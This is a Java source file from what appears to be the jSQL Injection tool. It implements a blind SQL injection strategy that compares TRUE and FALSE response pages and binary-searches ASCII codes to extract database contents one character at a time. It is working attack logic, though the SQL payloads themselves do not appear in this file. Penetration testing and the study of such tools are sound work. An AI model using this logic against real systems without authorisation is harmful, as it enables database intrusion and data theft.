package com.jsql.model.injection.strategy.blind;

import com.jsql.model.InjectionModel;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.strategy.blind.callable.CallableBlindBin;
import com.jsql.util.LogLevelUtil;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicInteger;

import static name.fraser.neil.plaintext.diff_match_patch.Diff;

/**
 * A blind attack class using concurrent threads.
 */
public class InjectionBlindBin extends AbstractInjectionMonobit<CallableBlindBin> {

    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();
    private static final int LOW = 0;
    private static final int HIGH = 127;

    // Source code of the TRUE web page (usually ?id=1)
    private String sourceReferencePage;

    /**
     * List of string differences found in all the FALSE queries, compared
     * to the reference page. Each FALSE pages should contain
     * at least one same string, which shouldn't be present in all
     * the TRUE queries.
     */
    private List<Diff> falseDiffs = new ArrayList<>();

    /**
     * Create blind attack initialization.
     * If every false diffs are not in true diffs and every true diffs are in
     * true diffs, then Blind attack is confirmed.
     */
    public InjectionBlindBin(InjectionModel injectionModel, BlindOperator blindMode) {
        super(injectionModel, blindMode);
        
        // No blind
        if (this.falsyBin.isEmpty() || this.injectionModel.isStoppedByUser()) {
            return;
        }
        
        // Call the SQL request which must be TRUE (usually ?id=1)
        this.sourceReferencePage = this.callUrl(StringUtils.EMPTY, "bin#ref");

        // Concurrent calls to the FALSE statements,
        // it will use inject() from the model
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetBlindBinTagFalse");
        Collection<CallableBlindBin> callablesFalseTest = new ArrayList<>();
        for (String falseTest: this.falsyBin) {
            callablesFalseTest.add(new CallableBlindBin(
                falseTest,
                injectionModel,
                this,
                blindMode,
                -1, -1, -1,
                "bin#falsy"
            ));
        }
        
        // Delete junk from the results of FALSE statements,
        // keep only diffs found in each and every FALSE pages.
        // Allow the user to stop the loop
        try {
            List<Future<CallableBlindBin>> futuresFalseTest = taskExecutor.invokeAll(callablesFalseTest);
            this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
            for (Future<CallableBlindBin> futureFalseTest: futuresFalseTest) {
                if (this.injectionModel.isStoppedByUser()) {
                    return;
                }
                if (this.falseDiffs.isEmpty()) {
                    this.falseDiffs = futureFalseTest.get().getDiffsWithReference();  // Init diffs
                } else {
                    this.falseDiffs.retainAll(futureFalseTest.get().getDiffsWithReference());  // Clean un-matching diffs
                }
            }
        } catch (ExecutionException e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        } catch (InterruptedException e) {
            LOGGER.log(LogLevelUtil.IGNORE, e, e);
            Thread.currentThread().interrupt();
        }

        if (this.injectionModel.isStoppedByUser()) {
            return;
        }
        
        this.cleanTrueDiffs(injectionModel, blindMode);
    }

    private void cleanTrueDiffs(InjectionModel injectionModel, BlindOperator blindMode) {
        // Concurrent calls to the TRUE statements,
        // it will use inject() from the model.
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetBlindBinTagTrue");
        Collection<CallableBlindBin> callablesTrueTest = new ArrayList<>();
        for (String trueTest: this.truthyBin) {
            callablesTrueTest.add(new CallableBlindBin(
                trueTest,
                injectionModel,
                this,
                blindMode,
                -1, -1, -1,
                "bin#truthy"
            ));
        }
        
        // Remove TRUE diffs in the FALSE diffs, because
        // a significant FALSE statement shouldn't contain any TRUE diff.
        // Allow the user to stop the loop.
        try {
            List<Future<CallableBlindBin>> futuresTrueTest = taskExecutor.invokeAll(callablesTrueTest);
            this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
            for (Future<CallableBlindBin> futureTrueTest: futuresTrueTest) {
                if (this.injectionModel.isStoppedByUser()) {
                    return;
                }
                this.falseDiffs.removeAll(futureTrueTest.get().getDiffsWithReference());
            }
        } catch (ExecutionException e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        } catch (InterruptedException e) {
            LOGGER.log(LogLevelUtil.IGNORE, e, e);
            Thread.currentThread().interrupt();
        }
    }

    @Override
    public CallableBlindBin getCallableBitTest(String sqlQuery, int indexChar, int bit) {
        return null;  // unused
    }

    @Override
    public boolean isInjectable() throws StoppedByUserSlidingException {
        if (this.injectionModel.isStoppedByUser()) {
            throw new StoppedByUserSlidingException();
        }
        var blindTest = new CallableBlindBin(
            this.injectionModel.getMediatorVendor().getVendor().instance().sqlBlindConfirm(),
            this.injectionModel,
            this,
            this.blindOperator,
            -1, -1, -1,
            "bin#confirm"
        );
        try {
            blindTest.call();
        } catch (Exception e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        }
        return blindTest.isTrue() && !this.falseDiffs.isEmpty();
    }

    @Override
    public void initNextChar(
        String sqlQuery,
        List<char[]> bytes,
        AtomicInteger indexChar,
        CompletionService<CallableBlindBin> taskCompletionService,
        AtomicInteger countTasksSubmitted,
        AtomicInteger countBadAsciiCode,
        CallableBlindBin currentCallable
    ) {
        int low;
        int mid;
        int high;

        if (currentCallable != null) {
            low = currentCallable.getLow();
            mid = currentCallable.getMid();
            high = currentCallable.getHigh();

            if (low >= high) {  // char found
                if (low == 0 || low == 127) {
                    countBadAsciiCode.incrementAndGet();
                } else {
                    low = currentCallable.isTrue() ? low : low - 1;
                }
                char[] asciiCodeMask = bytes.get(currentCallable.getCurrentIndex() - 1);  // bits for current url
                this.setAsciiCodeMask(asciiCodeMask, low);

                try {
                    this.injectCharacter(bytes, countBadAsciiCode, currentCallable);
                } catch (InjectionFailureException e) {
                    return;  // too many errors
                }

                bytes.add(AbstractInjectionBit.getBitsUnset());
                indexChar.incrementAndGet();
                low = InjectionBlindBin.LOW;
                high = InjectionBlindBin.HIGH;
            } else if (currentCallable.isTrue()) {  // current >= mid
                low = mid + 1;
            } else {  // current < mid
                high = mid - 1;
            }
            mid = low + (high - low) / 2;
        } else {
            low = InjectionBlindBin.LOW;
            mid = InjectionBlindBin.LOW + (InjectionBlindBin.HIGH - InjectionBlindBin.LOW) / 2;
            high = InjectionBlindBin.HIGH;
            bytes.add(AbstractInjectionBit.getBitsUnset());
            indexChar.incrementAndGet();
        }

        taskCompletionService.submit(
            new CallableBlindBin(
                sqlQuery,
                indexChar.get(),
                this.injectionModel,
                this,
                this.blindOperator,
                low, mid, high,
                String.format("bin#%s~%s<%s<%s", indexChar, low, mid, high)
            )
        );
        countTasksSubmitted.addAndGet(1);
    }

    private void setAsciiCodeMask(char[] asciiCodeMask, int value) {
        String binary = StringUtils.leftPad(Integer.toBinaryString((char) value), 8, "0");
        for (int i = 0; i <= 7; i++) {
            asciiCodeMask[i] = binary.charAt(i);
        }
    }

    @Override
    public char[] initMaskAsciiChar(List<char[]> bytes, CallableBlindBin currentCallable) {
        return bytes.get(currentCallable.getCurrentIndex() - 1);
    }

    @Override
    public String getInfoMessage() {
        return "- Strategy Blind bin: query True when Diffs are matching " + this.falseDiffs + "\n\n";
    }
    
    
    // Getter and setter

    public String getSourceReferencePage() {
        return this.sourceReferencePage;
    }
    
    public List<Diff> getFalseDiffs() {
        return this.falseDiffs;
    }
}
